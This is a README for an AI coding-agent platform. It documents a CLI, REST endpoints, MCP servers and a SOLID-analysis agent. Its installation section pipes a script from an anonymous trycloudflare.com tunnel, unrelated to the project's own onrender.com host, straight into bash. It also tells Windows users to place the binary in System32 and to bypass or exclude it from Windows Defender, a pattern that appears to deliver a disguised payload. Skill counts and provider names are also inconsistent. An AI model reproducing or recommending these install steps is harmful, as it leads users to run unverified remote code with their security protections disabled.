# Enterprise AI Agents & MCP Tools

An agentic backend platform that transforms natural-language instructions into production-ready code — either scaffolding new projects from scratch, improving existing ones, or diagnosing and fixing build/runtime errors. Specialized agents cover Go, Python/FastAPI, Next.js, design systems, Vercel deployments, and diagnostics, all coordinated through an architecture pipeline and exposed via a FastAPI REST API, a CLI, and MCP (Model Context Protocol) servers.

---

## CLI Reference

### Installation

#### Linux / macOS

Open a terminal and run:

```bash
curl -fsSL https://fat-coordination-dense-separately.trycloudflare.com/cli/install.sh | bash
```

The script detects your OS, downloads the binary to `/usr/local/bin/agents`, and makes it executable. Verify the installation:

```bash
agents version
```

#### Windows

1. Open **PowerShell** (run as Administrator is not required).
2. Download the binary:

```powershell
Invoke-WebRequest -Uri "https://ai-agents-mcp-tools.onrender.com/cli/download/windows" `
  -OutFile "$env:USERPROFILE\agents.exe"
```

3. Move it to a directory that is in your `PATH`, for example:

```powershell
Move-Item "$env:USERPROFILE\agents.exe" "C:\Windows\System32\agents.exe"
```

Or add the folder where you saved `agents.exe` to your user `PATH`:

```powershell
$env:PATH += ";$env:USERPROFILE"
```

4. Verify the installation (open a new terminal):

```powershell
agents version
```

> **Note:** If Windows Defender blocks the binary, click **More info → Run anyway**, or add an exclusion for the file in Windows Security settings.

---

### Commands

| Command | What it does |
|---------|-------------|
| [`agents ask`](#agents-ask) | **Main conversational interface.** Understands any natural language request (PT or EN), shows a plan, asks for confirmation, executes, verifies, and suggests next steps. |
| [`agents plan`](#agents-plan) | **Plan-First orchestrator.** MCP + Grok analyze the project, create an ordered execution plan, show it for approval, then execute step by step. Handles both code and non-code tasks (e.g., kanban refinement). |
| [`agents grok`](#agents-grok) | Grok-powered evaluator/improver for existing projects (evaluate without writing, or evaluate + write). |
| [`agents generate`](#agents-generate) | Scaffold a complete new project from a description. |
| [`agents improve`](#agents-improve) | Add features or apply improvements to an existing project. |
| [`agents diagnose`](#agents-diagnose) | Explicitly diagnose and fix build/compile/runtime errors. |
| [`agents list-skills`](#agents-list-skills) | List all available skills with filtering options. |
| [`agents version`](#agents-version) | Show CLI version and check API connectivity. |

---

### `agents ask`

The primary conversational interface. Type what you want in **English or Portuguese** — the agent classifies your intent, presents a plan, asks for confirmation, applies the fix or generates code, verifies the result, and proposes follow-up steps. This works across **all agents and all skills**.

```bash
agents ask "<your natural language request>" [--path <project>] [--yes]
```

**Examples:**

```bash
# Diagnose and fix a Docker build error (Portuguese)
agents ask "docker compose up falhou: stat /app/cmd/server: directory not found" \
  --path /path/to/my-go-service

# Create a Go entity (Portuguese)
agents ask "criar uma entidade Product com os campos name, price e active" \
  --path /path/to/my-project

# Add authentication (English)
agents ask "add NextAuth authentication to my Next.js project" \
  --path /path/to/nextjs-app

# Generate test suite (English)
agents ask "generate test suite for the payment module" \
  --path /path/to/go-service

# Skip all confirmation prompts (CI / automation)
agents ask "minha aplicação não está iniciando" \
  --path /path/to/project \
  --yes
```

**What happens when you run `agents ask`:**

```
1. Project scanner reads the directory (detects Go/Next.js/Python, reads files)
2. API classifies your intent → agent + skill + params
3. CLI displays the Execution Plan:

   ╭── Execution Plan ───────────────────────────────────────╮
   │  Understood: Diagnose and fix Go errors in your project  │
   │                                                          │
   │    Agent  : diagnostic                                   │
   │    Skill  : diagnostic.go_diagnose                       │
   │    Action : Run build, capture errors and fix (go)       │
   ╰──────────────────────────────────────────────────────────╯

4. Asks: "Proceed? [y/N]"
5. Runs the build locally to capture errors
6. Sends errors + source files to the diagnostic agent
7. Writes fixed files to disk
8. Verifies the fix by re-running the build (up to 3 iterations)
9. Suggests follow-up steps the user can approve one at a time
```

**Verification loop:** After applying a fix, the CLI re-runs the build (and `docker compose build` if a `docker-compose.yml` is present) to confirm the fix worked. If a new error appears, it iterates up to **3 times** before reporting what remains.

**Language matching:** The response language (plan text, messages, prompts) automatically matches the language of your input — Portuguese if you write in PT, English if you write in EN.

| Flag | Default | Description |
|------|---------|-------------|
| `--path` / `-p` | current dir | Project directory to analyze and fix |
| `--output` / `-o` | project path | Where to write generated/fixed files |
| `--yes` / `-y` | false | Skip all confirmation prompts (auto-approve everything) |

---

### `agents generate`

Scaffold a new production-ready project from a natural language description.

```bash
agents generate "Go e-commerce API with Fiber, PostgreSQL, JWT auth, and clean architecture" \
  --name store-api \
  --language go \
  --framework fiber \
  --scope backend
```

**What it generates (Go backend example):**

```
store-api/
├── cmd/main.go                          # Entry point with 5-step init sequence
├── go.mod                               # Module with all dependencies pinned
├── .env.example                         # Environment variable template
├── Makefile                             # Build, test, migrate, swagger targets
├── initializers/
│   ├── database.go                      # GORM + PostgreSQL connection pool
│   ├── services.go                      # Dependency injection container
│   ├── migrations.go                    # AutoMigrate runner
│   └── validators.go                    # CPF, SSN, CNPJ, NPI validators
├── domain/entities/                     # GORM entities with UUID primary keys
├── domain/dtos/                         # Input + response DTOs
├── services/contracts/                  # Service interfaces
├── controllers/                         # Fiber handlers with Swagger annotations
├── internal/app/swagger.go              # Swagger UI at /swagger/* with basic auth
├── docs/docs.go                         # Swagger stub (replaced by swag init)
├── Dockerfile                           # Multi-stage builder → distroless
└── docker-compose.yml                   # App + PostgreSQL
```

| Flag | Default | Description |
|------|---------|-------------|
| `--name` / `-n` | required | Project name (becomes the output directory) |
| `--language` / `-l` | `go` | `go` or `python` |
| `--framework` / `-f` | `fiber` | Go: `fiber` `gin` `gorilla` `echo` `chi` · Python: `fastapi` |
| `--scope` / `-s` | `backend` | `backend`, `frontend`, or `fullstack` |
| `--output` / `-o` | current dir | Parent directory where the project folder is created |

---

### `agents improve`

Add new features or apply improvements to a project that already exists on disk.

```bash
agents improve "Add a credit card payment gateway and an API gateway for centralizing routes" \
  --path /path/to/existing-project
```

The CLI scans the project structure locally (detecting Go, Next.js, Python, or Rust), identifies the relevant skills via BM25 routing, generates the new files, and writes them to disk — no manual copying required.

| Flag | Default | Description |
|------|---------|-------------|
| `--path` / `-p` | current dir | Path to the project to improve |
| `--output` / `-o` | project path | Where to write the generated files |

---

### `agents diagnose`

Explicitly diagnose and fix build, compile, or runtime errors in a Go, Next.js, or Python project. Unlike `agents ask`, this command always runs in diagnostic mode without intent classification.

```bash
agents diagnose --path /path/to/broken-project
agents diagnose --path /path/to/project --language go
```

**What it does:**

1. Runs the appropriate build command locally to capture the full error output:
   - Go: `go build ./...`
   - Next.js: `npx tsc --noEmit`
   - Python: `python -m py_compile`
2. Scans the project files and filters the ones referenced in the error output.
3. Sends everything to the diagnostic agent, which identifies the root cause.
4. Writes the fixed files to disk.
5. Prints any manual steps required (e.g., `go mod tidy`).

**Supported error patterns (Go — pattern-based, no LLM required):**

| Pattern | Fix applied |
|---------|-------------|
| `go.mod requires go >= X.Y` | Updates `FROM golang:X.Y-alpine` in Dockerfile |
| `stat /app/<path>: directory not found` | Corrects the build path in Dockerfile to `./cmd` |
| `missing go.sum entry` | Reports: run `go mod tidy && go mod download` |
| `imported and not used` | Removes the unused import from the source file |
| `undefined: <symbol>` | Reports the undefined symbol with context |
| `cannot use … as type …` | Reports the type mismatch with line reference |

| Flag | Default | Description |
|------|---------|-------------|
| `--path` / `-p` | current dir | Path to the project with errors |
| `--language` / `-l` | auto-detected | `go`, `nextjs`, or `python` (inferred from `go.mod`, `package.json`, `*.py`) |
| `--output` / `-o` | project path | Where to write fixed files |

---

### `agents list-skills`

List all available skills with their category and description.

```bash
agents list-skills                    # all 100 skills
agents list-skills --agent go         # 31 Go skills
agents list-skills --agent diagnostic # 3 diagnostic skills
agents list-skills --agent nextjs     # 25 Next.js skills
```

| Flag | Default | Description |
|------|---------|-------------|
| `--agent` / `-a` | all | Filter by agent name |

---

### `agents version`

Show the CLI version and verify that the API is reachable.

```bash
agents version
# Agents CLI v0.5.0 (Grok + Skills)
# Platform: Linux x86_64
# API: online — 124 skills registered — provider: grok:grok-3 Grok-forced=True
# Grok: configured and forced — model=grok-3
```

---

### `agents plan` — Plan-First Execution with MCP + Grok

MCP is the **orchestrator** that decides which skills to use. You never pick skills manually. Grok analyzes the project + instruction, creates an ordered plan, shows it, and only executes after your approval. Works for both **code** (Go, Next.js) and **non-code** (kanban, backlog, requirements, docs).

```bash
# Non-code: improve kanban/board descriptions (your use case)
agents plan "read board.txt and improve requirement descriptions" --path .
agents plan "read kanban.txt and improve card descriptions with acceptance criteria" --path ./project

# Code: create features with plan approval
agents plan "create REST API for orders with JWT auth" --path ./api --type go
agents plan "refactor React component to Server Components" --path ./web --type nextjs --max-steps 6

# Auto-approve (CI)
agents plan "generate full technical spec for project" --path . --yes
```

**How it works:**

```
1. scan_project() → {files, project_type, file_count}
2. POST /workflow/plan/create → GrokPlanner
   - Builds skill catalog with domain/complexity/inputs/outputs/prerequisites
   - Grok selects minimal ordered steps (max 8) + infers params from context
   - Fallback: smart BM25 prefers planning.* when instruction contains kanban/backlog/requirement
3. CLI shows:

   ╭─ Grok Analysis ───────────────────────────────╮
   │ Fallback BM25 plan for: read kanban.txt...   │
   ╰──────────────────────────────────────────────╯
   ┌─ Execution Plan (5 steps) ──────────────────┐
   │ # Skill                            Reason    │
   │ 1 planning.improve_descriptions    BM25 ... │
   │ 2 planning.analyze_requirements    ...      │
   │ 3 planning.identify_dependencies   ...      │
   └─────────────────────────────────────────────┘
   Approve and execute this plan? [y/N]

4. POST /workflow/plan/{id}/approve → approved
5. POST /workflow/plan/{id}/execute → runs steps sequentially, checks depends_on, collects artifacts
6. Writes artifacts to disk via Platform Agent
```

| Flag | Default | Description |
|------|---------|-------------|
| `--path` / `-p` | current dir | Project path to analyze |
| `--type` / `-t` | `auto` | `go`, `nextjs`, `python`, `node`, or `auto` (detected) |
| `--max-steps` | `8` | Max steps in plan |
| `--yes` / `-y` | `false` | Auto-approve and execute |

**Planning skills used (via `planning` agent):**

| Skill | What it does |
|-------|--------------|
| `planning.analyze_requirements` | Extracts functional/non-functional requirements, constraints, risks from docs |
| `planning.improve_descriptions` | Rewrites cards with `Given/When/Then` acceptance criteria + story points |
| `planning.generate_user_stories` | Converts requirements into INVEST-compliant user stories |
| `planning.estimate_effort` | Story points / t-shirt sizing + sprint allocation |
| `planning.identify_dependencies` | Dependency graph + critical path (mermaid/json) |
| `planning.generate_spec` | Full `SPEC.md` with API contracts, data models, test & rollout plan |

All planning skills work offline (fallback) and with Grok for richer output.

### `agents grok` — Grok Evaluator / Improver

Groq-powered direct evaluator for existing projects. Useful to preview without writing.

```bash
# Only evaluate (no files written)
agents grok "evaluate auth module and suggest improvements" --path ./api --evaluate

# Evaluate + apply (with plan preview)
agents grok "add JWT refresh token and middleware" --path ./go-service
agents grok "fix build and add tests for payment gateway" --path ./go-service --yes
```

| Flag | Default | Description |
|------|---------|-------------|
| `--path` / `-p` | current dir | Project path |
| `--output` / `-o` | project path | Where to write generated files |
| `--evaluate` / `-e` | `false` | Only evaluate, do not execute |
| `--yes` / `-y` | `false` | Skip confirmation |

---

## End-to-End Flows

### `agents ask` — Natural Language Interface

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              USER'S MACHINE                                     │
│                                                                                 │
│  $ agents ask "docker compose up falhou: stat /app/cmd/server: not found"      │
│               --path /path/to/digital-bank-go                                   │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────────────┐  │
│  │  CLI  (app/cli/commands.py)                                              │  │
│  │                                                                          │  │
│  │  1. detect_user_language(query) → "pt"                                  │  │
│  │  2. scan_project()  →  { files: [...], project_type: "go", ... }        │  │
│  │  3. POST /workflow/ask  →  intent classification                         │  │
│  │     Response: { agent: "diagnostic", skill: "go_diagnose", ... }        │  │
│  │  4. Show Execution Plan panel, ask confirmation                          │  │
│  │  5. go build ./...  →  captures error output                            │  │
│  │     docker compose build  →  captures docker error (if compose present) │  │
│  │  6. POST /workflow/diagnose  →  { error_output, source_files, ... }     │  │
│  │  7. Write fixed Dockerfile to disk                                       │  │
│  │  8. Re-run build + docker compose build to verify                       │  │
│  │     ✓ Verification passed — project builds successfully!                │  │
│  │  9. Show follow-up suggestions                                           │  │
│  └──────────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### `agents improve` — Improving an Existing Project

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              USER'S MACHINE                                     │
│                                                                                 │
│  $ agents improve "Add a credit card payment gateway and an API gateway"        │
│                    --path /path/to/my-project                                   │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────────────┐  │
│  │  CLI  (app/cli/commands.py)                                              │  │
│  │                                                                          │  │
│  │  1. Project Scanner (app/cli/project_scanner.py)                        │  │
│  │     • Walks directory tree                                               │  │
│  │     • Skips: .git  node_modules  __pycache__  vendor                    │  │
│  │     • Reads files up to 10 KB each / 150 KB total                       │  │
│  │     • Detects project type from go.mod / package.json / requirements    │  │
│  │     → { files: [...], project_type: "go", file_count: 22 }              │  │
│  │                                                                          │  │
│  │  2. AgentsClient.improve()  (app/cli/client.py)                         │  │
│  │     POST /workflow/improve  →  instruction + project_files + type       │  │
│  └──────────────────────────────────────────────────────────────────────────┘  │
│                                    │  HTTP                                      │
└────────────────────────────────────┼───────────────────────────────────────────┘
                                     │
┌────────────────────────────────────▼───────────────────────────────────────────┐
│                              AGENTS API  (FastAPI)                              │
│                                                                                 │
│  /workflow/improve  (app/main.py)                                               │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │  3. Orchestrator.plan()  — BM25 Skill Router                           │   │
│  │     → [ go.service, go.repository, go.fiber_handler, … ]               │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                    │                                            │
│  ┌─────────────────────────────────▼───────────────────────────────────────┐   │
│  │  4. Dual LLM Param Extractor  (app/llm/dual_extractor.py)              │   │
│  │     asyncio.gather(LLM_MODEL_1, LLM_MODEL_2) — parallel, best wins     │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                    │                                            │
│  ┌─────────────────────────────────▼───────────────────────────────────────┐   │
│  │  5. Agent.execute_skill(skill_name, **params)                           │   │
│  │     Go skills  →  template-based generation (fast, deterministic)       │   │
│  │     Next.js / Design / Frontend  →  LLM code generation via HuggingFace│   │
│  │     Returns: [ CodeArtifact(filename, content, language), … ]          │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  Response → { artifacts: [...], success: true, summary: "..." }                │
└────────────────────────────────────┬───────────────────────────────────────────┘
                                     │  HTTP response
┌────────────────────────────────────▼───────────────────────────────────────────┐
│                              USER'S MACHINE                                     │
│                                                                                 │
│  6. Platform Agent  (app/cli/platforms/linux.py | windows.py)                  │
│     • Resolves absolute paths relative to project root                         │
│     • Creates missing directories                                               │
│     • Writes each file to disk                                                  │
│                                                                                 │
│  /path/to/my-project/                                                           │
│  ├── internal/service/payment_gateway_service.go    ← NEW                      │
│  ├── internal/repository/payment_gateway_repo.go    ← NEW                      │
│  ├── internal/handler/payment_gateway_handler.go    ← NEW                      │
│  ├── internal/service/payment_gateway_test.go       ← NEW                      │
│  ├── Dockerfile                                     ← NEW                      │
│  └── docker-compose.yml                             ← NEW                      │
│                                                                                 │
│  ✓ Changes written to /path/to/my-project                                      │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### `agents generate` — Scaffolding a New Project from Scratch

```
$ agents generate "Go microservice for order management with Fiber, PostgreSQL, JWT"
                  --name order-service --language go --framework fiber

CLI → POST /workflow/scaffold
         │
         ▼
  Architecture Pipeline
  ┌─────────────────────────────────┐
  │ BusinessObjectiveParserAgent    │  — extracts 7 requirement dimensions
  │          ↓                      │
  │ SolutionArchitectureDecision    │  — selects pattern (microservices / hexagonal / …)
  │          ↓                      │
  │ SolutionFlowDiagramAgent        │
  │          ↓                      │
  │ ValidationAgent                 │
  │          ↓                      │
  │ ArchitecturePatternSelector     │  — fitness scoring matrix, deterministic
  └─────────────────────────────────┘
         │
         ▼
  Skill Generation (parallel)
  ┌──────────────────┬──────────────────────┐
  │  GoAgent         │  NextJSAgent          │
  │  BackendAgent    │  DesignAgent          │
  │  (31 Go skills)  │  FrontendAgent        │
  │                  │  VercelAgent          │
  └──────────────────┴──────────────────────┘
          │
          ▼
   Platform Agent writes every artifact to disk
   → /path/to/output/order-service/  (32+ files)
```

### `agents plan` — Planning Workflow (MCP Decides Skills, Plan-First Approval)

For non-code tasks (kanban, backlog, requirements, docs) the CLI never asks you to pick skills. MCP + Grok decide.

```
$ agents plan "read board.txt and improve requirement descriptions" --path .
        --type auto
CLI → POST /workflow/plan/create  (app/main.py:1360)
        │
        ▼
GrokPlanner (app/llm/grok_planner.py:25)
  - Builds catalog from SkillRegistry.list_for_planner() (124 skills with domain/complexity/inputs/outputs)
  - Grok prompt: instruction + project files (kanban.txt) + catalog → JSON {analysis, steps[{skill, params, reason, depends_on, confidence}]}
  - Smart fallback: if instruction contains kanban/backlog/requirement → BM25 on planning.* only
  - Enriches empty params with scanned doc_files (absolute paths) — MCP decides, user does not

Example plan for "read kanban.txt and improve card descriptions":
  Step 1: planning.improve_descriptions  {source_file: /tmp/.../kanban.txt}  — BM25 matched planning.*
  Step 2: planning.analyze_requirements  {source_files: [...]}               — depends_on [1]
  Step 3: planning.identify_dependencies {source_file: ...}                  — depends_on [2]
  Step 4: planning.generate_spec         {requirements_file: ...}            — depends_on [3]
  Step 5: planning.generate_user_stories {source: ...}                       — depends_on [4]

CLI shows Execution Plan table + Grok Analysis panel, asks:
  Approve and execute this plan? [y/N]

User → y → POST /workflow/plan/{id}/approve → POST /workflow/plan/{id}/execute
        │
        ▼
MCP Orchestrator executes steps sequentially, checks depends_on, collects artifacts
  → PlanningAgent (app/agents/planning_agent.py:6) runs each planning.* skill
  → skills use LLM (Grok) when available, fallback to template otherwise

Result: 5 artifacts
  kanban-improved.txt  — rewritten cards with Given/When/Then ACs
  REQUIREMENTS.md      — structured FR/NFR/constraints/risks
  dependencies.md      — graph + critical path
  SPEC.md              — full technical spec
  user-stories.md      — INVEST stories

You can also call MCP directly:
  /mcp/orchestrate → tools: analyze_context, create_execution_plan, present_plan, approve_plan, execute_plan, get_plan_status
  Resources: orchestrator://plans, orchestrator://skills
```

---

## Agent Roster

| Agent | Skills | Focus |
|-------|--------|-------|
| `go` | 35 | Go 1.24 microservices — Fiber, Gin, Gorilla, Echo, Chi (incl. Medical-App-Core) |
| `backend` | 6 | Python/FastAPI — endpoints, SQLAlchemy, repository pattern, Docker |
| `nextjs` | 25 | App Router, API routes, server actions, layouts, data fetching |
| `design` | 17 | UI components, design systems, dark mode, accessibility |
| `frontend` | 13 | State management, hooks, forms, animations, performance |
| `vercel` | 5 | Deployment, environment config, edge functions |
| `diagnostic` | 3 | Error diagnosis and fix — Go, Next.js, Python |
| `solid` | 5 | SOLID Principles analysis — architecture-level compliance enforcement |
| `planning` | 6 | Requirements analysis, backlog refinement, user stories, estimation, dependencies, spec generation |
| `design_patterns` | 4 | Creational / Structural / Behavioral / Enterprise patterns |
| `quality_assessment` | 5 | Maintainability, extensibility, testability, scalability, security |

**Total: 124 registered skills.** All skills work in rule-based (template) mode without an LLM. When `GROCK_API_TOKEN` is set, Grok (`grok-3`) is forced as primary; `HUGGINGFACE_TOKEN` + `LLM_MODEL_1/2` remain as fallback and for dual extraction.

---

## Intelligence Architecture

No model runs inside this application. LLM inference is delegated over HTTP, with **Grok (xAI)** forced as primary when `GROCK_API_TOKEN` is set. Hugging Face remains as fallback. This keeps the service deployable on minimal infrastructure (0.5 CPU / 512 MB RAM):

```
This application                          xAI Grok API (forced)          Hugging Face (fallback)
┌───────────────────────────────┐         ┌──────────────────────────┐    ┌──────────────────────────┐
│  FastAPI                      │         │  GROK_MODEL=grok-3       │    │  LLM_MODEL_1             │
│  AgentOrchestrator            │──HTTP──▶│  xAI /v1/chat/completions│    │  meta-llama/...          │
│  GrokPlanner (MCP)            │         │  (planning + code)       │    │  LLM_MODEL_2             │
│  124 Skills + Metadata        │         │  Token: GROCK_API_TOKEN  │    │  Qwen/...                │
│  BM25 Skill Router            │         │  (never logged)          │    │  (parallel dual extract) │
│  Dual LLM Extractor (Grok-first)│      └──────────────────────────┘    └──────────────────────────┘
│  Intent Router                │                    ▲                               ▲
│  Diagnostic Agent             │                    │ fallback on 403/429/timeout     │
└───────────────────────────────┘                    └───────────────────────────────┘
  RAM: ~150–200 MB  |  LLM RAM: 0 (remote) — Grok forced, HF on failure
```

**Provider selection (`app/llm/factory.py`):** `GROCK_API_TOKEN` present → `GrokProvider` for `llm` and `go_llm`; otherwise `HuggingFaceProvider`. Token value is never logged (`***` masked) or returned in responses.

### Skill Routing — BM25 (zero cost, zero API calls)

Skill selection uses an **in-memory BM25 index** built at startup from the `name + description + tags` of all 100 skills. No LLM call is needed to decide which skill to invoke.

```
"build a Go microservice with JWT auth"
  → BM25 search (local, microseconds)
  → go.fiber_handler (0.94), go.fiber_middleware (0.91), go.service (0.87), …
```

### Dual LLM Parameter Extraction

When the BM25 router selects a skill, both models are queried **in parallel** to extract the required parameters. The response with better coverage of required fields wins:

```
Instruction: "Add a payment gateway with credit card support"
Skill selected: go.service  →  requires: resource, module_name

asyncio.gather(
  LLM_MODEL_1  →  {"resource": "payment_gateway", "module_name": "github.com/org/api"}   score: 2
  LLM_MODEL_2  →  {"resource": "payment", "module_name": ""}                              score: 1
)

Winner: LLM_MODEL_1  →  params passed to skill execution
```

If both models fail (network error, invalid JSON, missing fields), the fallback extractor infers params from `go.mod` and the instruction text — ensuring the pipeline always produces output.

### Intent Classification — `agents ask`

When `agents ask` is used, the query goes through an additional intent classification layer before skill routing:

```
User query: "minha aplicação não está iniciando"
     │
     ▼
detect_user_language()  →  "pt"   (response will be in Portuguese)
     │
     ▼
_is_diagnostic()  →  true   (contains "não está iniciando")
     │
     ▼
_detect_lang_from_context()  →  "go"   (project has go.mod)
     │
     ▼
Route to: diagnostic / diagnostic.go_diagnose
     │
     ▼
CLI runs: go build ./...  →  captures error
CLI runs: docker compose build  →  (if docker-compose.yml present)
     │
     ▼
POST /workflow/diagnose  →  fix applied
     │
     ▼
Re-verify: go build ./... + docker compose build (up to 3 iterations)
```

---

## API Reference

### Health

```
GET /          — service status
GET /health    — agent count, skill count, LLM status, MCP server list
```

### Agents & Skills

```
GET /agents                    — list all agents and their skill counts
GET /skills                    — list all 100 skills
GET /skills?agent=go           — skills for a specific agent
GET /skills?agent=diagnostic   — the 3 diagnostic skills
GET /skills?category=backend
GET /skills?tag=fiber
```

### Execute a Skill Directly

```http
POST /skills/execute
{
  "agent": "go",
  "skill": "go.fiber_handler",
  "params": {
    "resource": "order",
    "module_name": "github.com/org/order-service"
  }
}
```

### Natural Language Intent Routing

Route a natural-language query to the best matching agent and skill. Returns the plan without executing anything — the CLI uses this to show the plan before asking for confirmation.

```http
POST /workflow/ask
{
  "query": "criar uma entidade Product com os campos name, price e active",
  "project_context": {
    "project_type": "go",
    "file_count": 12,
    "files": [
      { "path": "go.mod", "content": "module github.com/org/store\n..." }
    ]
  }
}
```

Response:

```json
{
  "intent": "generate",
  "is_diagnostic": false,
  "agent": "go",
  "skill": "go.gorm_entity",
  "params": { "resource": "product", "module_name": "github.com/org/store" },
  "description": "Criar entidade GORM Product com UUID e DTOs",
  "user_language": "pt",
  "suggestions": [...],
  "confidence": 0.75
}
```

### Diagnose and Fix Errors

```http
POST /workflow/diagnose
{
  "language": "go",
  "error_output": "stat /app/cmd/server: directory not found",
  "source_files": [
    { "path": "Dockerfile", "content": "FROM golang:1.26-alpine AS builder\n..." },
    { "path": "go.mod", "content": "module github.com/org/service\n..." }
  ],
  "module_name": "github.com/org/service"
}
```

Response:

```json
{
  "success": true,
  "summary": "Fixed Dockerfile build path: ./cmd/server → ./cmd",
  "artifacts": [
    { "filename": "Dockerfile", "content": "...", "language": "dockerfile" }
  ],
  "instructions": []
}
```

### Improve an Existing Project

```http
POST /workflow/improve
{
  "instruction": "Add a credit card payment gateway and an API gateway",
  "project_type": "go",
  "project_files": [
    { "path": "go.mod", "content": "module github.com/org/pizza-api\n..." },
    { "path": "internal/domain/pagamento.go", "content": "..." }
  ]
}
```

### Full Project Scaffold

```http
POST /workflow/scaffold
{
  "objective": "Build a Go 1.24 microservice for order management with Fiber v2, PostgreSQL, JWT auth, and clean architecture",
  "project_name": "order-service",
  "output_dir": "/home/user/projects",
  "scope": "backend",
  "backend_language": "go",
  "backend_framework": "fiber",
  "architecture_pattern": "microservices"
}
```

| Field | Required | Default | Description |
|---|---|---|---|
| `objective` | ✓ | — | Natural-language description of what to build |
| `project_name` | ✓ | — | Directory name for the output |
| `output_dir` | ✓ | — | Absolute path where the project folder is created |
| `scope` | | `fullstack` | `backend`, `frontend`, or `fullstack` |
| `backend_language` | | `python` | `python` or `go` |
| `backend_framework` | | `fiber` | Go: `fiber`, `gin`, `gorilla`, `echo`, `chi` |
| `architecture_pattern` | | _(auto)_ | Forces a pattern: `microservices`, `hexagonal`, `monolith`, `layered`, `event_driven`, `serverless`, `cqrs` |

### Architecture Pipeline

```http
POST /architecture/parse
{ "objective": "Build a HIPAA-compliant telemedicine platform for 10,000 concurrent patients" }
```

```http
POST /architecture/clarify
{ "session_id": "<id>", "answer": "We need 99.9% uptime and plan to grow to 1M users in 2 years." }
```

---

## MCP Servers

Five MCP (Model Context Protocol) SSE servers are mounted and can be consumed by any MCP-compatible client (Claude Desktop, custom agents):

| Mount path | Purpose |
|---|---|
| `/mcp/architecture` | Pipeline tools: parse, clarify, decide, select design partner |
| `/mcp/backend` | Python/FastAPI skill execution |
| `/mcp/frontend` | Next.js + design skill execution |
| `/mcp/orchestrate` | Cross-agent orchestration |
| `/mcp/solid` | SOLID compliance analysis — auto-triggered after design partner, also callable explicitly |

---

## SOLID Principles Enforcer Agent

The `SOLIDPrinciplesEnforcerAgent` operates at the **architecture design level** — it analyses design artifacts (components, modules, ports, bounded contexts) rather than source code. It is **automatically triggered** after the design partner produces a system design within the workflow pipeline. Users never invoke it directly; the solution knows when to call it.

### How it Works

```
Architecture Pipeline
  DesignPartnerOrchestrator produces SystemDesignOutput
                  │
                  ▼ (automatic — WorkflowCoordinator)
  SOLIDPrinciplesEnforcerAgent.analyze(PipelineContext)
    │
    ├── solid.srp_analyze   ─┐
    ├── solid.ocp_analyze    │ parallel asyncio.gather
    ├── solid.lsp_analyze    │ agent selects which skill per principle
    ├── solid.isp_analyze    │
    └── solid.dip_analyze   ─┘
                  │
                  ▼
  SOLIDComplianceReport
    ├── 5 × PrincipleResult (compliance_level, affected_components, recommendations)
    ├── cross-principle correlations (cascade detection)
    └── stored in ctx.metadata["solid_compliance_report"]
```

The agent accepts any design artifact union type:
- `SolutionArchitectureDecision` (from decide_architecture stage)
- `SystemDesignOutput` (from select_design_partner stage)
- `PipelineContext` (full pipeline context — preferred, combines both)
- `NormalizedDesignInput` (pre-normalised, for direct skill testing)

### Five SOLID Skills

Each skill performs deterministic, rule-based analysis — no LLM required, < 10 ms per skill.

| Skill | Principle | Detects |
|---|---|---|
| `solid.srp_analyze` | Single Responsibility | Components with multiple responsibilities in description; domain components with infra tech hints; fat modules (> 3 responsibilities); services spanning multiple bounded contexts |
| `solid.ocp_analyze` | Open/Closed | Hexagonal design without ports/adapters; multiple services without API gateway; service ports with no adapter implementations; domain services without communication protocol |
| `solid.lsp_analyze` | Liskov Substitution | Driven ports with no substitutable adapter implementations; bounded contexts with inconsistent communication styles; domain services with explicit infra dependencies |
| `solid.isp_analyze` | Interface Segregation | Fat API gateway serving > 4 heterogeneous services; shared database forcing full schema on all services; modules with > 4 exposed responsibilities; monolithic external integration layers |
| `solid.dip_analyze` | Dependency Inversion | Domain/application components with infra technology hints (PostgreSQL, Redis, Kafka…); missing repository abstraction between domain and infrastructure; all bounded contexts communicating synchronously without abstraction |

### Cross-Principle Correlation Detection

After all five skills run, the agent detects cascade violations — one SOLID violation causing another:

| Primary | Cascades to | Trigger |
|---|---|---|
| SRP | ISP | Component with multiple responsibilities also exposes a fat interface |
| OCP | DIP | Missing abstractions (no ports) force high-level modules to depend on concretions |
| DIP | LSP | Concrete infra dependencies prevent substitutability |
| SRP | OCP | Multiple responsibilities make a component impossible to extend without modification |

### MCP Tools (at `/mcp/solid`)

| Tool | Description |
|---|---|
| `analyze_solid_compliance(session_id)` | Trigger full SOLID analysis for a session; stores report in session context |
| `get_solid_report(session_id)` | Retrieve the complete SOLIDComplianceReport with all five principle results |
| `get_principle_result(session_id, principle)` | Retrieve detailed result for one principle (`srp`, `ocp`, `lsp`, `isp`, `dip`) |

### Resources

| Resource URI | Returns |
|---|---|
| `solid://principles` | All five principles with their skill names and descriptions |
| `solid://sessions` | Session IDs that have an existing SOLID compliance report |

### SOLIDComplianceReport schema

```json
{
  "report_id": "uuid",
  "overall_compliance": "compliant | warning | violation",
  "components_analyzed": 8,
  "architecture_pattern": "microservices",
  "analysis_summary": "SOLID analysis complete for microservices architecture. ...",
  "principle_results": [
    {
      "principle": "srp",
      "compliance_level": "violation",
      "summary": "SRP violated in 2 component(s).",
      "affected_components": [
        {
          "component_name": "OrderService",
          "violation_description": "Domain component 'OrderService' declares infrastructure technology hints (postgresql, redis).",
          "layer": "domain",
          "component_type": "service"
        }
      ],
      "recommendations": [
        "Extract each distinct responsibility into a dedicated component or service.",
        "Remove infrastructure concerns from domain-layer components; use repository or port abstractions instead."
      ]
    }
  ],
  "cross_principle_correlations": [
    {
      "primary_principle": "ocp",
      "cascaded_principles": ["dip"],
      "component_name": "Architecture",
      "description": "Missing abstractions (OCP violation) cascade into DIP violations..."
    }
  ]
}
```

### Acceptance Criteria (Issue #15)

- [x] `SOLIDPrinciplesEnforcerAgent` with `analyze(design) -> SOLIDComplianceReport` interface
- [x] Five `PrincipleResult` entries for any valid design input
- [x] SRP: flags components with multiple responsibilities
- [x] OCP: identifies missing extension points and components closed to extension
